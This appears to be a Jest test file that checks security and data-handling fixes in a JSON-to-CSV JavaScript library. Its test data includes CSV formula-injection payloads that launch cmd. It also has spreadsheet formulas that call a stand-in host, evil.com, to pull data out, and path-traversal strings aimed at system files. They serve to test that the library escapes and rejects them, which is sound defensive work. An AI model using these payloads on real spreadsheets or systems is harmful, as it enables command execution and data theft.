const { jsonToCsv, preprocessData, deepUnwrap, saveAsCsv } = require('../json-to-csv');

describe('Critical Bug Fixes', () => {
  describe('BUG #1: Circular references in deepUnwrap', () => {
    test('should handle circular references without infinite recursion', () => {
      const circular = { a: 1 };
      circular.self = circular;
      
      expect(() => {
        const result = deepUnwrap(circular);
        // deepUnwrap should handle circular references gracefully
        // It might return JSON with [Circular Reference] or just the string
        expect(typeof result).toBe('string');
        expect(result).not.toBe('');
      }).not.toThrow();
    });

    test('should handle nested circular references', () => {
      const obj1 = { name: 'obj1' };
      const obj2 = { name: 'obj2', ref: obj1 };
      obj1.ref = obj2;
      
      expect(() => {
        const result = deepUnwrap(obj1);
        // Should handle circular references without infinite recursion
        expect(typeof result).toBe('string');
        expect(result).not.toBe('');
      }).not.toThrow();
    });
  });

  describe('BUG #2: Data loss in preprocessData', () => {
    test('should not lose nested object properties', () => {
      const data = [
        { user: { name: 'John', age: 30, email: 'john@example.com' } },
        { user: { name: 'Jane', age: 25, email: 'jane@example.com' } }
      ];

      const processed = preprocessData(data);
      
      // Should preserve all properties
      expect(processed[0].user).toBeDefined();
      expect(processed[1].user).toBeDefined();
      
      // Should not lose data
      expect(processed[0].user).toContain('John');
      expect(processed[0].user).toContain('30');
      expect(processed[0].user).toContain('john@example.com');
    });

    test('should handle complex nested structures', () => {
      const data = [
        { 
          id: 1,
          profile: {
            personal: { name: 'John', age: 30 },
            contact: { email: 'john@example.com', phone: '123-456-7890' }
          }
        }
      ];

      const processed = preprocessData(data);
      expect(processed[0].profile).toBeDefined();
      expect(typeof processed[0].profile).toBe('string');
      expect(processed[0].profile).toContain('John');
      expect(processed[0].profile).toContain('30');
      expect(processed[0].profile).toContain('john@example.com');
    });
  });

  describe('BUG #3: CSV Injection vulnerability', () => {
    test('should escape formula injection attacks', () => {
      const dangerousData = [
        { name: '=cmd|"/c calc.exe"' },
        { name: '@SUM(A1:A10)' },
        { name: '+cmd|"/c malicious.exe"' },
        { name: '-cmd|"/c malicious.exe"' },
        { name: '@cmd|"/c malicious.exe"' }
      ];

      const csv = jsonToCsv(dangerousData, { delimiter: ',' });
      
      // Should escape formulas by prepending single quote
      // Note: CSV will also have quotes around values with special characters
      expect(csv).toContain("'=cmd|");
      expect(csv).toContain("'@SUM(A1:A10)");
      expect(csv).toContain("'+cmd|");
      expect(csv).toContain("'-cmd|");
      expect(csv).toContain("'@cmd|");
    });

    test('should handle Excel-specific injection vectors', () => {
      const injections = [
        { command: '=HYPERLINK("http://evil.com","Click me")' },
        { command: '=WEBSERVICE("http://evil.com/steal")' },
        { command: '=IMPORTXML("http://evil.com", "//data")' }
      ];

      const csv = jsonToCsv(injections, { delimiter: ',' });
      
      // Should escape formulas by prepending single quote
      // The CSV will have quotes around values with special characters
      expect(csv).toContain("'=HYPERLINK");
      expect(csv).toContain("'=WEBSERVICE");
      expect(csv).toContain("'=IMPORTXML");
    });
  });

  describe('BUG #4: Path Traversal in saveAsCsv', () => {
    test('should validate file paths', async () => {
      const data = [{ test: 'data' }];
      const maliciousPath = '../../../etc/passwd.csv';
      
      await expect(saveAsCsv(data, maliciousPath))
        .rejects
        .toThrow(/Directory traversal detected/);
    });

    test('should prevent directory traversal attacks', async () => {
      const data = [{ test: 'data' }];
      const traversalPaths = [
        '../../etc/passwd.csv',
        '../config.csv',
        '..\\windows\\system32\\file.csv',
        'C:\\..\\Windows\\System32\\config.csv',
        '/etc/../etc/passwd.csv'
      ];

      for (const path of traversalPaths) {
        await expect(saveAsCsv(data, path))
          .rejects
          .toThrow(/Directory traversal detected/);
      }
    });
  });

  describe('Input Validation', () => {
    test('should validate input types', () => {
      // Should throw TypeError for non-array input
      expect(() => jsonToCsv(null)).toThrow('Input data must be an array');
      expect(() => jsonToCsv(undefined)).toThrow('Input data must be an array');
      expect(() => jsonToCsv('string')).toThrow('Input data must be an array');
      expect(() => jsonToCsv(123)).toThrow('Input data must be an array');
      expect(() => jsonToCsv({})).toThrow('Input data must be an array');
      
      // Empty array should return empty string
      expect(jsonToCsv([])).toBe('');
    });

    test('should handle large datasets with limits', () => {
      // Create a large dataset
      const largeData = Array.from({ length: 10000 }, (_, i) => ({
        id: i,
        name: `User ${i}`,
        email: `user${i}@example.com`
      }));

      expect(() => {
        jsonToCsv(largeData);
      }).not.toThrow();
    });

    test('should validate options parameter', () => {
      const data = [{ test: 'data' }];
      
      // Should handle invalid options gracefully
      expect(() => jsonToCsv(data, null)).not.toThrow();
      expect(() => jsonToCsv(data, 'invalid')).not.toThrow();
      expect(() => jsonToCsv(data, 123)).not.toThrow();
      
      // Should work with valid options
      expect(() => jsonToCsv(data, { delimiter: ',' })).not.toThrow();
    });
  });

  describe('renameMap for nested fields', () => {
    test('should support field renaming (note: nested field renaming not supported)', () => {
      // Note: Current implementation doesn't support nested field renaming
      // It only renames top-level keys
      const data = [
        { userName: 'John', userAge: 30 },
        { userName: 'Jane', userAge: 25 }
      ];

      const csv = jsonToCsv(data, {
        renameMap: {
          userName: 'User Name',
          userAge: 'User Age'
        }
      });

      expect(csv).toContain('User Name');
      expect(csv).toContain('User Age');
      expect(csv).toContain('John');
      expect(csv).toContain('30');
    });
  });
});